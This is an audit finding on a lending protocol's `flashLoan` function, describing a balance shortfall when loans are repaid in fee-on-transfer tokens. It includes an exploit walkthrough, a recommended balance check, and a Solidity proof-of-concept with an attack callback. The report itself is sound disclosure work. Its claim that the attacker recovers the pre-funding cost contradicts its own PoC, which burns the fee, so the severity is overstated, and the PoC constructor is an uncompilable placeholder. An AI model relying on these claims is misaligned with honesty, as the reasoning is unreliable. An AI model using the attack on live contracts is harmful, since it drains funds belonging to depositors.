### Title
Fee-on-Transfer Token in `flashLoan` Permanently Drains Protocol Balance - (`src/Midnight.sol`)

### Summary
`flashLoan` sends `assets[i]` out via `safeTransfer`, then pulls back exactly `assets[i]` via `safeTransferFrom`. With a fee-on-transfer token, the inbound `safeTransferFrom` call deducts `assets[i]` from the callback's balance but credits only `assets[i] * (1 - fee_rate)` to Midnight, creating a permanent balance shortfall of `assets[i] * fee_rate` per flash loan. No balance-before/after check exists, and the formal verification suite explicitly excludes fee-on-transfer tokens from its solvency proofs.

### Finding Description
**Exact code path** — `src/Midnight.sol` lines 737–752:

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());
    emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);       // (A)
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()
    );
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // (B)
    }
}
```

`SafeTransferLib.safeTransferFrom` (lines 24–34) only checks that the call does not revert and that the return value is `true`. It does not verify the amount actually credited to `address(this)`.

**Root cause** — With a fee-on-transfer token:
- Step (A): Midnight sends `assets[i]`; callback receives `assets[i] * (1 - f)`. Midnight balance: `−assets[i]`.
- Step (B): `transferFrom(callback, midnight, assets[i])` deducts `assets[i]` from callback but credits only `assets[i] * (1 - f)` to Midnight. Midnight balance: `+assets[i] * (1 - f)`.
- Net per call: Midnight balance `−assets[i] * f`.

**Attacker inputs and exploit flow:**
1. Attacker identifies a fee-on-transfer token `T` held by Midnight (e.g., as collateral or loan token in any market).
2. Attacker deploys a callback contract `C` pre-funded with `assets * f` of token `T` and approves Midnight to pull `assets` from `C`.
3. Attacker calls `midnight.flashLoan([T], [assets], C, data)`.
4. Midnight sends `assets` → `C` receives `assets * (1 - f)`. Combined with the pre-funded `assets * f`, `C` holds exactly `assets`.
5. `C.onFlashLoan` returns `CALLBACK_SUCCESS`.
6. `safeTransferFrom(T, C, midnight, assets)` succeeds (C has `assets`), but Midnight only receives `assets * (1 - f)`.
7. Midnight's balance is now `assets * f` less than before the call.
8. Repeat to drain the full balance.

**Why existing checks fail:**
- `safeTransferFrom` only checks call success and boolean return — it cannot detect fee-on-transfer shortfall.
- There is no token allowlist on `flashLoan`; any token Midnight holds can be targeted.
- The Certora `tokenBalanceCorrect` solvency invariant in `certora/specs/Solvency.spec` line 31–33 explicitly assumes "no fee taking from sender or receiver" — fee-on-transfer tokens are entirely outside the verified model.
- `live_context.json` line 233 acknowledges "fee-on-transfer … should be tested if not explicitly excluded," confirming no explicit exclusion exists in the protocol itself.

### Impact Explanation
Each `flashLoan` call with a fee-on-transfer token permanently reduces Midnight's actual token balance by `fee_rate * assets` without any corresponding reduction in tracked accounting (collateral, withdrawable, claimableSettlementFee). This breaks the core solvency invariant: `tokenBalance[token][Midnight] >= collateralSum(token) + withdrawableSum(token) + claimableSettlementFee(token)`. Repeated calls drain the balance until lenders cannot withdraw, borrowers' collateral cannot be returned, and fee claims fail — a complete reserve drain for any fee-on-transfer token held by the protocol.

### Likelihood Explanation
**Preconditions:** A fee-on-transfer token must be used as a loan token or collateral token in any Midnight market. This is a realistic scenario (e.g., USDT with fees enabled, or any custom ERC20 with a transfer tax). The attacker needs only to pre-fund the callback with `assets * fee_rate` tokens — a cost that is recovered from the drained balance. The attack is permissionless, requires no special role, and is fully repeatable in a loop within a single transaction via `multicall` or repeated external calls.

### Recommendation
Add a balance-before/balance-after check in `flashLoan` to enforce that Midnight's actual received amount equals `assets[i]`:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    uint256 balanceBefore = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore + assets[i], FlashLoanNotRepaid());
}
```

Alternatively, document and enforce at the market-creation level that fee-on-transfer tokens are not supported, and add a runtime guard that reverts `flashLoan` if the net balance does not recover.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Midnight} from "../src/Midnight.sol";
import {IFlashLoanCallback} from "../src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";

// Fee-on-transfer token: charges fee_rate on every transfer
contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant FEE_RATE = 100; // 1% = 100 bps
    uint256 public constant BPS = 10000;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external { allowance[msg.sender][spender] = amount; }

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount * FEE_RATE / BPS;
        uint256 received = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += received;
        // fee is burned
    }
    function transfer(address to, uint256 amount) external returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }
}

contract AttackCallback is IFlashLoanCallback {
    function onFlashLoan(address, address[] calldata tokens, uint256[] calldata amounts, bytes calldata)
        external returns (bytes32)
    {
        // Approve repayment of full amounts (callback has pre-funded fee shortfall)
        for (uint256 i = 0; i < tokens.length; i++) {
            FeeToken(tokens[i]).approve(msg.sender, amounts[i]);
        }
        return CALLBACK_SUCCESS;
    }
}

contract FeeOnTransferFlashLoanTest is Test {
    Midnight midnight;
    FeeToken feeToken;
    AttackCallback callback;

    uint256 constant FLASH_AMOUNT = 1000e18;
    uint256 constant FEE_RATE = 100;
    uint256 constant BPS = 10000;

    function setUp() public {
        midnight = new Midnight(/* constructor args */);
        feeToken = new FeeToken();
        callback = new AttackCallback();

        // Midnight holds tokens (e.g., deposited as collateral)
        feeToken.mint(address(midnight), FLASH_AMOUNT);
        // Pre-fund callback with fee shortfall: FLASH_AMOUNT * FEE_RATE / BPS
        uint256 feeShortfall = FLASH_AMOUNT * FEE_RATE / BPS;
        feeToken.mint(address(callback), feeShortfall);
    }

    function testFeeOnTransferDrainsBalance() public {
        uint256 balanceBefore = feeToken.balanceOf(address(midnight));

        address[] memory tokens = new address[](1);
        tokens[0] = address(feeToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_AMOUNT;

        midnight.flashLoan(tokens, amounts, address(callback), "");

        uint256 balanceAfter = feeToken.balanceOf(address(midnight));
        uint256 expectedDrain = FLASH_AMOUNT * FEE_RATE / BPS;

        // Assert: Midnight's balance decreased by fee_rate * assets
        assertEq(balanceBefore - balanceAfter, expectedDrain, "balance drained by fee");
        // Assert: balance is now less than what accounting expects
        // (collateralSum + withdrawableSum > actual balance)
        assertLt(balanceAfter, balanceBefore, "solvency invariant violated");
    }
}
```

**Expected assertions:**
- `balanceBefore - balanceAfter == FLASH_AMOUNT * FEE_RATE / BPS` — confirms drain per call.
- Repeating the call N times: `balanceAfter == balanceBefore - N * FLASH_AMOUNT * FEE_RATE / BPS`.
- A stateful invariant test asserting `feeToken.balanceOf(midnight) >= collateralSum + withdrawableSum` will fail after one flash loan. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)
